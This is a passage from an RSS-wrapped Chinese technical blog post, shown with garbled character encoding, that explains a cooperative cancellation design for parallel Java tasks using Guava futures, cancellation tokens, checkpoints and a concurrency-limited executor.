<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°]]></title>    <link>https://juejin.cn/post/7600955777315848230</link>    <guid>https://juejin.cn/post/7600955777315848230</guid>    <pubDate>2026-01-30T13:01:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315848230" data-draft-id="7600953879500931123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T13:01:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¡¦è¯´ç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/2212689394274136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212689394274136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¡¦è¯´ç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:02.000Z" title="Fri Jan 30 2026 13:01:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ ¹æ®æˆ‘æœ€è¿‘åšçš„çº¿ç¨‹æ± ä»»åŠ¡æ”¯æŒåä½œå¼å–æ¶ˆåŠŸèƒ½å†™çš„ï¼Œä»£ç ä¸­å¯èƒ½æ¶‰åŠä¸€äº›æ— å…³å†…å®¹ï¼Œè¯·é…Œæƒ…å¿½ç•¥ã€‚å†…å®¹æ¶‰åŠï¼š</p>
<ol>
<li>é‡åº¦ä¾èµ– <code>ListenableFuture</code> å®ç°å–æ¶ˆæœºåˆ¶</li>
<li>ä½¿ç”¨ <code>TTL/ThreadLocal</code> å®ç°ä¸Šä¸‹æ–‡ä¼ æ’­(å®é™…ä¸Šï¼Œå¦‚æœèƒ½æ‰‹åŠ¨æ˜¾å¼ä¼ é€’ä¸Šä¸‹æ–‡æœ€å¥½ï¼‰</li>
<li>ä¹‹å‰æ–‡ç« æåˆ°çš„å¹¶å‘åº¦æ§åˆ¶ä¹Ÿæ”¯æŒäº†å–æ¶ˆæœºåˆ¶</li>
<li>èµ„æºæ¸…ç†</li>
</ol>
<p>ä¸ºäº†ä½¿é—®é¢˜ä¸è¿‡äºå¤æ‚ï¼Œåˆ é™¤äº†å…³äºåµŒå¥—å–æ¶ˆä¼ æ’­çš„å†…å®¹ï¼Œä¸‹ç¯‡æ–‡ç« ä¼šè°ˆåˆ°ï¼Œæ•¬è¯·æœŸå¾…ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨é«˜å¹¶å‘ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¹¶è¡Œæ‰§è¡Œå¤§é‡å­ä»»åŠ¡ã€‚ç„¶è€Œï¼Œå½“å‡ºç°ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œç»§ç»­æ‰§è¡Œå‰©ä½™ä»»åŠ¡å¾€å¾€æ˜¯èµ„æºæµªè´¹ï¼š</p>
<ol>
<li><strong>è¶…æ—¶</strong>ï¼šæ€»ä½“ä»»åŠ¡å·²è¶…æ—¶ï¼Œç»§ç»­æ‰§è¡Œæ— æ„ä¹‰</li>
<li><strong>å¿«é€Ÿå¤±è´¥ï¼ˆFail-Fastï¼‰</strong>ï¼šæŸä¸ªå­ä»»åŠ¡å¼‚å¸¸ï¼Œæ•´æ‰¹ä»»åŠ¡ç»“æœå·²ä¸å¯ç”¨</li>
<li><strong>ä¸»åŠ¨å–æ¶ˆ</strong>ï¼šä¸šåŠ¡é€»è¾‘åˆ¤æ–­ä¸å†éœ€è¦ç»“æœ</li>
</ol>
<p>Java åŸç”Ÿçš„ <code>Thread.interrupt()</code> åªèƒ½ä¸­æ–­é˜»å¡æ“ä½œï¼ˆå¦‚ <code>sleep</code>ã€<code>wait</code>ã€<code>BlockingQueue.take</code>ï¼‰ï¼Œæ— æ³•ä¸­æ–­æ­£åœ¨æ‰§è¡Œ CPU å¯†é›†å‹ä»£ç çš„çº¿ç¨‹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€å¥—<strong>åä½œå¼å–æ¶ˆæœºåˆ¶ï¼ˆCooperative Cancellationï¼‰</strong>ã€‚</p>
<h2 data-id="heading-1">è®¾è®¡ç›®æ ‡</h2>
<ol>
<li><strong>ç»Ÿä¸€çš„å–æ¶ˆä¿¡å·ä¼ é€’</strong>ï¼šæ‰€æœ‰å¹¶è¡Œå­ä»»åŠ¡å…±äº«åŒä¸€ä¸ªå–æ¶ˆä»¤ç‰Œ</li>
<li><strong>æ”¯æŒå¤šç§å–æ¶ˆåŸå› </strong>ï¼šè¶…æ—¶ã€å¼‚å¸¸ã€ä¸»åŠ¨å–æ¶ˆ</li>
<li><strong>è½»é‡çº§æ£€æŸ¥ç‚¹</strong>ï¼šä»»åŠ¡å¯ä»¥åœ¨å…³é”®èŠ‚ç‚¹ä¸»åŠ¨æ£€æŸ¥å–æ¶ˆçŠ¶æ€</li>
<li><strong>å»¶è¿Ÿç»‘å®š</strong>ï¼šå–æ¶ˆä»¤ç‰Œåœ¨ä»»åŠ¡æäº¤åæ‰ç»‘å®šå®é™…çš„ Future</li>
<li><strong>èµ„æºè‡ªåŠ¨é‡Šæ”¾</strong>ï¼šå–æ¶ˆåè‡ªåŠ¨æ¸…ç†æœªå®Œæˆä»»åŠ¡</li>
</ol>
<h2 data-id="heading-2">æ ¸å¿ƒç»„ä»¶è®¾è®¡</h2>
<h3 data-id="heading-3">1. CancellationTokenState - å–æ¶ˆçŠ¶æ€æšä¸¾</h3>
<p>é¦–å…ˆå®šä¹‰æ¸…æ™°çš„çŠ¶æ€æšä¸¾ï¼Œé¿å…é­”æ³•æ•°å­—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CancellationTokenState</span> {
    <span class="hljs-comment">/** ä»»åŠ¡æ­£åœ¨è¿è¡Œ */</span>
    RUNNING(<span class="hljs-number">0</span>),
    <span class="hljs-comment">/** ä»»åŠ¡æˆåŠŸå®Œæˆ */</span>
    SUCCESS(<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** ç©ºæ“ä½œ */</span>
    NO_OP(<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** å› å…¶ä»–ä»»åŠ¡å¼‚å¸¸è€Œå–æ¶ˆï¼ˆå¿«é€Ÿå¤±è´¥ï¼‰ */</span>
    FAIL_FAST_CANCELLED(-<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** å› è¶…æ—¶è€Œå–æ¶ˆ */</span>
    TIMEOUT_CANCELLED(-<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** å› ä¸»åŠ¨è°ƒç”¨ cancel() è€Œå–æ¶ˆ */</span>
    MUTUAL_CANCELLED(-<span class="hljs-number">3</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> value;

    <span class="hljs-comment">/**
     * åˆ¤æ–­æ˜¯å¦éœ€è¦å–æ¶ˆå­ä»»åŠ¡
     * è´Ÿå€¼çŠ¶æ€è¡¨ç¤ºéœ€è¦å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldCancelSubtasks</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.value &lt; <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨æ­£å€¼è¡¨ç¤ºæ­£å¸¸çŠ¶æ€ï¼Œè´Ÿå€¼è¡¨ç¤ºå–æ¶ˆçŠ¶æ€</li>
<li><code>shouldCancelSubtasks()</code> æ–¹æ³•æä¾›è¯­ä¹‰åŒ–çš„åˆ¤æ–­æ¥å£</li>
</ul>
<h3 data-id="heading-4">2. CancellationToken - å–æ¶ˆä»¤ç‰Œ</h3>
<p>å–æ¶ˆä»¤ç‰Œæ˜¯æ•´ä¸ªæœºåˆ¶çš„æ ¸å¿ƒï¼Œè´Ÿè´£ï¼š</p>
<ul>
<li>è·Ÿè¸ªä»»åŠ¡æ‰¹æ¬¡çš„æ•´ä½“çŠ¶æ€</li>
<li>ä¼ é€’å–æ¶ˆä¿¡å·</li>
<li>æ”¯æŒå»¶è¿Ÿç»‘å®š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CancellationToken</span> {
    <span class="hljs-comment">// ä½¿ç”¨ SettableFuture æ”¯æŒå»¶è¿Ÿç»‘å®š</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SettableFuture&lt;Object&gt; futureToken = SettableFuture.create();
    <span class="hljs-comment">// åŸå­çŠ¶æ€ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AtomicReference&lt;CancellationTokenState&gt; state =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(RUNNING);

    <span class="hljs-comment">/**
     * å»¶è¿Ÿç»‘å®šï¼šåœ¨ä»»åŠ¡æäº¤åç»‘å®šå®é™…çš„ Future
     *
     * <span class="hljs-doctag">@param</span> futures æ‰€æœ‰å­ä»»åŠ¡çš„ Future åˆ—è¡¨
     * <span class="hljs-doctag">@param</span> timeout è¶…æ—¶æ—¶é—´
     * <span class="hljs-doctag">@param</span> submitCanceller æäº¤å™¨çš„å–æ¶ˆ Future
     */</span>
    <span class="hljs-meta">@SuppressWarnings({"unchecked", "raw"})</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">lateBind</span><span class="hljs-params">(List&lt;ListenableFuture&lt;T&gt;&gt; futures,
                             Duration timeout,
                             ListenableFuture&lt;?&gt; submitCanceller)</span> {
        <span class="hljs-comment">// å¿«é€Ÿå¤±è´¥ Futureï¼šä»»ä½•ä¸€ä¸ªä»»åŠ¡å¤±è´¥éƒ½ä¼šè§¦å‘</span>
        FluentFuture&lt;?&gt; failFastFuture = FluentFuture.from(Futures.allAsList(futures))
                .catchingAsync(Throwable.class,
                    ex -&gt; Futures.immediateCancelledFuture(), directExecutor())
                .withTimeout(timeout, TimerService.getTimer());

        <span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡çš„ç»„åˆ Future</span>
        ListenableFuture&lt;?&gt; allFutures = Futures.successfulAsList(
            Futures.successfulAsList(futures), submitCanceller);

        <span class="hljs-comment">// ç›‘å¬å¿«é€Ÿå¤±è´¥ Future çš„å®Œæˆäº‹ä»¶</span>
        failFastFuture.addCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(Object result)</span> {
                state.compareAndSet(RUNNING, SUCCESS);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailure</span><span class="hljs-params">(Throwable t)</span> {
                <span class="hljs-comment">// å–æ¶ˆæ‰€æœ‰ä»»åŠ¡</span>
                allFutures.cancel(<span class="hljs-literal">true</span>);
                <span class="hljs-comment">// æ ¹æ®å¼‚å¸¸ç±»å‹è®¾ç½®çŠ¶æ€</span>
                <span class="hljs-keyword">if</span> (t <span class="hljs-keyword">instanceof</span> TimeoutException) {
                    state.compareAndSet(RUNNING, TIMEOUT_CANCELLED);
                } <span class="hljs-keyword">else</span> {
                    state.compareAndSet(RUNNING, FAIL_FAST_CANCELLED);
                }
            }
        }, directExecutor());

        <span class="hljs-comment">// ç»‘å®šåˆ° futureToken</span>
        futureToken.setFuture(failFastFuture);
    }

    <span class="hljs-comment">/**
     * ä¸»åŠ¨å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancel</span><span class="hljs-params">(<span class="hljs-type">boolean</span> useInterrupt)</span> {
        state.compareAndSet(RUNNING, MUTUAL_CANCELLED);
        futureToken.cancel(useInterrupt);
    }

    <span class="hljs-keyword">public</span> CancellationTokenState <span class="hljs-title function_">checkState</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> state.get();
    }
}
</code></pre>
<p><strong>å…³é”®è®¾è®¡</strong>ï¼š</p>
<ol>
<li>
<p><strong>å»¶è¿Ÿç»‘å®šï¼ˆLate Bindingï¼‰</strong>ï¼š<code>SettableFuture</code> å…è®¸å…ˆåˆ›å»º Tokenï¼Œåç»‘å®šå®é™… Futureï¼Œè§£å†³"å…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹"é—®é¢˜</p>
</li>
<li>
<p><strong>å¿«é€Ÿå¤±è´¥è¯­ä¹‰</strong>ï¼šä½¿ç”¨ <code>Futures.allAsList()</code> + <code>catchingAsync</code> å®ç°â€”â€”åªè¦æœ‰ä¸€ä¸ªä»»åŠ¡å¤±è´¥ï¼Œç«‹å³è§¦å‘å–æ¶ˆ</p>
</li>
<li>
<p><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼š<code>withTimeout()</code> è®¾ç½®è¶…æ—¶ï¼Œè¶…æ—¶åè§¦å‘ <code>TimeoutException</code></p>
</li>
</ol>
<h3 data-id="heading-5">3. Checkpoints - æ£€æŸ¥ç‚¹æœºåˆ¶</h3>
<p>ç”±äºæ— æ³•å¼ºåˆ¶ä¸­æ–­ CPU å¯†é›†å‹ä»£ç ï¼Œæˆ‘ä»¬åœ¨ä»»åŠ¡ä»£ç ä¸­æ’å…¥"æ£€æŸ¥ç‚¹"ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checkpoints</span> {

    <span class="hljs-comment">/**
     * æ ‡å‡†æ£€æŸ¥ç‚¹ï¼šæ£€æŸ¥ cancelToken çŠ¶æ€
     * å¦‚æœä»»åŠ¡å·²å–æ¶ˆï¼ŒæŠ›å‡ºå–æ¶ˆå¼‚å¸¸
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkpoint</span><span class="hljs-params">(String taskName, <span class="hljs-type">boolean</span> lean)</span> {
        <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> TaskScopeTl.getParallelOptions();
        <span class="hljs-keyword">if</span> (taskName == <span class="hljs-literal">null</span> || options == <span class="hljs-literal">null</span>
                || <span class="hljs-string">"task"</span>.equals(options.getTaskName())
                || !taskName.equals(options.getTaskName())) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancelToken</span> <span class="hljs-operator">=</span> TaskScopeTl.getCancellationToken();
        <span class="hljs-keyword">if</span> (cancelToken != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (cancelToken.checkState().shouldCancelSubtasks()) {
                <span class="hljs-keyword">throw</span> lean
                    ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">LeanCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>)
                    : <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel during running"</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * åŸå§‹æ£€æŸ¥ç‚¹ï¼šåªæ£€æŸ¥çº¿ç¨‹ä¸­æ–­æ ‡å¿—
     * é€‚ç”¨äºä¸ä½¿ç”¨ cancelToken çš„åœºæ™¯
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rawCheckpoint</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (Thread.interrupted()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatCancellationException</span>(<span class="hljs-string">"Cancel by interruption"</span>);
        }
    }
}
</code></pre>
<p><strong>ä¸¤ç§å–æ¶ˆå¼‚å¸¸</strong>ï¼š</p>
<ul>
<li><code>FatCancellationException</code>ï¼šå¸¦å®Œæ•´å †æ ˆï¼Œä¾¿äºè°ƒè¯•</li>
<li><code>LeanCancellationException</code>ï¼šæ— å †æ ˆï¼Œç”Ÿäº§ç¯å¢ƒå‡å°‘å¼€é”€</li>
</ul>
<h3 data-id="heading-6">4. ScopedCallable - å¸¦ä½œç”¨åŸŸçš„ Callable åŒ…è£…å™¨</h3>
<p>åŒ…è£…åŸå§‹ä»»åŠ¡ï¼Œæ·»åŠ ä¸Šä¸‹æ–‡ç»‘å®šå’Œç›‘æ§èƒ½åŠ›ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScopedCallable</span>&lt;V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;V&gt;, Attachable {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PARALLEL_OPTIONS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"parallelOptions"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_CANCELLATION_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cancellationToken"</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String taskName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Callable&lt;V&gt; delegate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Object&gt; attachments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. å‡†å¤‡ä¸Šä¸‹æ–‡ï¼šç»‘å®š CancellationToken åˆ° ThreadLocal</span>
        TaskScopeTl.init(getCancellationToken(), getParallelOptions());
        TaskPair.init(taskName);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. æ‰§è¡Œæ£€æŸ¥ç‚¹ï¼ˆä»»åŠ¡å¼€å§‹å‰æ£€æŸ¥ï¼‰</span>
            Checkpoints.checkpoint(taskName, <span class="hljs-literal">true</span>);
            startTime = ticker.read();
            <span class="hljs-comment">// 3. æ‰§è¡Œå®é™…ä»»åŠ¡</span>
            <span class="hljs-keyword">return</span> delegate.call();
        } <span class="hljs-keyword">finally</span> {
            endTime = ticker.read();
            <span class="hljs-comment">// 4. æ¸…ç†ä¸Šä¸‹æ–‡</span>
            TaskScopeTl.remove();
            <span class="hljs-comment">// 5. è®°å½•ç›‘æ§æŒ‡æ ‡</span>
            recordMetrics();
        }
    }
}
</code></pre>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>é€šè¿‡ <code>Attachable</code> æ¥å£æ”¯æŒä»»æ„ä¸Šä¸‹æ–‡ä¼ é€’</li>
<li>ä»»åŠ¡æ‰§è¡Œå‰è‡ªåŠ¨è°ƒç”¨æ£€æŸ¥ç‚¹</li>
<li>ä½¿ç”¨ <code>ThreadLocal</code> ä¼ é€’å–æ¶ˆä»¤ç‰Œï¼Œå­æ–¹æ³•å¯éšæ—¶æ£€æŸ¥</li>
</ul>
<h3 data-id="heading-7">5. ConcurrentLimitExecutor - å¹¶å‘é™åˆ¶æ‰§è¡Œå™¨</h3>
<p>æ§åˆ¶åŒæ—¶æ‰§è¡Œçš„ä»»åŠ¡æ•°é‡ï¼Œå®ç°"æ»‘åŠ¨çª—å£"æäº¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentLimitExecutor</span>&lt;V&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ExecutorCompletionService&lt;V&gt; cs;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BlockingQueue&lt;ListenableFuture&lt;V&gt;&gt; blockingQueue =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ParallelOptions options;

    <span class="hljs-comment">/**
     * æäº¤æ‰€æœ‰ä»»åŠ¡ï¼Œç«‹å³è¿”å› Future åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">public</span> AsyncBatchResult&lt;V&gt; <span class="hljs-title function_">submitAll</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks)</span> {
        Builder&lt;ListenableFuture&lt;V&gt;&gt; resultBuilder =
            ImmutableList.builderWithExpectedSize(tasks.size());

        <span class="hljs-comment">// 1. ç«‹å³æäº¤åˆå§‹æ‰¹æ¬¡ï¼ˆæ•°é‡ = å¹¶è¡Œåº¦ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Math.min(tasks.size(), options.getParallelism());
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; start; i++) {
            resultBuilder.add(fallbackSubmit(tasks, i));
        }

        <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> tasks.size() - start;
        <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                    .results(resultBuilder.build())
                    .build();
        }

        <span class="hljs-comment">// 2. ä¸ºå‰©ä½™ä»»åŠ¡åˆ›å»º SettableFuture å ä½</span>
        List&lt;SettableFuture&lt;V&gt;&gt; others = IntStream.range(<span class="hljs-number">0</span>, remaining)
                .mapToObj(ignore -&gt; SettableFuture.&lt;V&gt;create())
                .collect(toImmutableList());

        ImmutableList&lt;ListenableFuture&lt;V&gt;&gt; results =
            resultBuilder.addAll(others).build();

